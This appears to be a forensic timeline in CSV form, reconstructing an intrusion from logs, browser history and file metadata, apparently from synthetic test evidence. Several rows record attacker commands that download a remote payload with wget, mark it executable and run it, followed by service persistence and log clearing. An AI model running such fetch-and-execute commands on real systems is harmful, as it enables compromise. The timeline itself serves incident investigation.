timestamp_utc,action,user,object_path,artifact,plugin,confidence,rationale,tags,event_id
2024-03-10T14:30:00+00:00,FILE_CREATE,[USER_001],evidence/investigation_memo.docx,ooxml:core_properties,file_metadata,0.98,OOXML dcterms:created metadata,,2393b8b9-8ea0-505d-8f56-ab9e69cb94c3
2024-03-10T20:50:00+00:00,WEB_VISIT,UNKNOWN,https://github.com/malicious/repo,Browser:Chromium:evidence/History,browser,0.97,Chromium last_visit_time WebKit timestamp,web;browser_history,91ca2324-e683-51ce-9a54-edcd8826c1a0
2024-03-10T21:00:00+00:00,WEB_VISIT,UNKNOWN,https://pastebin.com/raw/d849fa,Browser:Chromium:evidence/History,browser,0.97,Chromium last_visit_time WebKit timestamp,web;browser_history,19f1b0e5-6be8-552f-a1cd-9965800f5f01
2024-03-11T01:50:00+00:00,FILE_WRITE,[USER_002],evidence/investigation_memo.docx,ooxml:core_properties,file_metadata,0.98,OOXML dcterms:modified metadata,CONFLICT;TIMESTOMP_SUSPECT,7eb48e3b-f3f7-5193-ad41-1a6843472146
2024-03-11T02:14:07+00:00,AUTH_LOGIN,[USER_003],,EVTX:evidence/Security_Events.jsonl,evtx,0.99,Windows Event Log JSON entry for Event ID 4624,logon,83c718bb-4f23-5cb3-a6e3-2e466c4ad678
2024-03-11T02:14:07+00:00,AUTH_LOGIN,UNKNOWN,sshd[4401],Linux:sshd[4401]:evidence/auth.log,linux_logs,0.85,Syslog entry for sshd[4401] (assumed year 2024),auth,9d65096a-6ff2-516d-a94f-6e44374c49a8
2024-03-11T02:15:00+00:00,PROCESS_START,UNKNOWN,wget http://[IP_004]/payload.sh,Linux:bash_history:evidence/bash_history,linux_logs,0.95,Bash history command execution with Unix timestamp,execution;bash,9f93c3ea-851e-5310-ac07-e2ac799f95fc
2024-03-11T02:15:30+00:00,FILE_ACCESS,UNKNOWN,sudo,Linux:sudo:evidence/auth.log,linux_logs,0.85,Syslog entry for sudo (assumed year 2024),,1e9877e9-498b-5129-a8cd-e34ee883bfdc
2024-03-11T02:16:00+00:00,PROCESS_START,UNKNOWN,chmod +x payload.sh,Linux:bash_history:evidence/bash_history,linux_logs,0.95,Bash history command execution with Unix timestamp,execution;bash,f6d2f55f-221d-5d40-885c-755ec9c66285
2024-03-11T02:16:15+00:00,PROCESS_START,[USER_003],,EVTX:evidence/Security_Events.jsonl,evtx,0.99,Windows Event Log JSON entry for Event ID 4688,execution;process_create,6ded5620-e31b-5773-96b0-7d218247de02
2024-03-11T02:17:00+00:00,PROCESS_START,UNKNOWN,./payload.sh,Linux:bash_history:evidence/bash_history,linux_logs,0.95,Bash history command execution with Unix timestamp,execution;bash,387d751a-3abe-54b2-9bc7-7f4bd9d8a2f9
2024-03-11T02:17:30+00:00,SERVICE_INSTALL,UNKNOWN,,EVTX:evidence/Security_Events.jsonl,evtx,0.99,Windows Event Log JSON entry for Event ID 7045,persistence;service,d076c5da-e98f-51c9-a58c-c838417f83c9
2024-03-11T02:18:45+00:00,FILE_ACCESS,UNKNOWN,sshd[4401],Linux:sshd[4401]:evidence/auth.log,linux_logs,0.85,Syslog entry for sshd[4401] (assumed year 2024),auth,19522c3c-d0a3-51cf-918a-9b126de3810b
2024-03-11T02:20:00+00:00,LOG_CLEARED,[USER_003],,EVTX:evidence/Security_Events.jsonl,evtx,0.99,Windows Event Log JSON entry for Event ID 1102,anti_forensics;log_cleared,f1a9c869-8dff-5f41-b867-78e4f450dec2
2026-10-08T10:01:58.539355+00:00,FILE_WRITE,UNKNOWN,evidence/auth.log,filesystem:stat,file_metadata,0.95,Filesystem stat modification time (mtime),,3e98dc96-54c5-5bba-8877-91717f2c0181
2026-10-08T10:01:58.545404+00:00,FILE_WRITE,UNKNOWN,evidence/bash_history,filesystem:stat,file_metadata,0.95,Filesystem stat modification time (mtime),,b3149f3f-e557-5ac0-832e-ac4963357f2b
2026-10-08T10:01:58.550889+00:00,FILE_WRITE,UNKNOWN,evidence/Security_Events.jsonl,filesystem:stat,file_metadata,0.95,Filesystem stat modification time (mtime),,7e9b4da4-6a23-5ecc-ba78-d2f928c7bee7
2026-10-08T10:01:58.619588+00:00,FILE_WRITE,UNKNOWN,evidence/History,filesystem:stat,file_metadata,0.95,Filesystem stat modification time (mtime),,57b60d51-94b5-5fc6-9ace-54f9daa34e05
2026-10-08T10:01:58.636041+00:00,FILE_WRITE,UNKNOWN,evidence/investigation_memo.docx,filesystem:stat,file_metadata,0.95,Filesystem stat modification time (mtime),,810a270a-7db5-5daa-ad73-1d21a4d9d304
2026-10-08T10:01:58.650600+00:00,FILE_WRITE,UNKNOWN,evidence/exfiltrated_files.zip,filesystem:stat,file_metadata,0.95,Filesystem stat modification time (mtime),,e84c7aae-650e-54f9-a9a4-6aa32f252d30
2026-10-08T10:01:58.783298+00:00,FILE_CREATE,UNKNOWN,evidence/auth.log,filesystem:stat,file_metadata,0.9,Filesystem stat creation/change time (ctime/birthtime),,f751299f-8659-5a59-bd4c-69cfce325f64
2026-10-08T10:02:00.353020+00:00,FILE_CREATE,UNKNOWN,evidence/bash_history,filesystem:stat,file_metadata,0.9,Filesystem stat creation/change time (ctime/birthtime),,7bcfc4be-4383-5d98-a009-492ee34c0d0c
2026-10-08T10:02:01.368922+00:00,FILE_CREATE,UNKNOWN,evidence/exfiltrated_files.zip,filesystem:stat,file_metadata,0.9,Filesystem stat creation/change time (ctime/birthtime),,e484a7ce-21ff-508f-aede-b182b2bb79ec
2026-10-08T10:02:02.418484+00:00,FILE_CREATE,UNKNOWN,evidence/History,filesystem:stat,file_metadata,0.9,Filesystem stat creation/change time (ctime/birthtime),,08843680-4a22-53a2-a639-45f1a81d7534
2026-10-08T10:02:03.493529+00:00,FILE_CREATE,UNKNOWN,evidence/investigation_memo.docx,filesystem:stat,file_metadata,0.9,Filesystem stat creation/change time (ctime/birthtime),,c9e7f03f-e928-5998-8c75-1eae4e6764a2
2026-10-08T10:02:04.433918+00:00,FILE_CREATE,UNKNOWN,evidence/Security_Events.jsonl,filesystem:stat,file_metadata,0.9,Filesystem stat creation/change time (ctime/birthtime),,582b5565-5bb5-577d-a316-47bc525bae35
2026-10-08T15:31:58+00:00,FILE_WRITE,UNKNOWN,evidence/exfiltrated_files.zip::financial_report.pdf,zip:entry_central_dir,file_metadata,0.85,ZIP entry central directory DOS timestamp,,65900488-b8a8-52b6-a562-6a6ce865d076
2026-10-08T15:31:58+00:00,FILE_WRITE,UNKNOWN,evidence/exfiltrated_files.zip::passwords.txt,zip:entry_central_dir,file_metadata,0.85,ZIP entry central directory DOS timestamp,,cf362c13-e251-5b6e-85d7-17daad8fb9ae
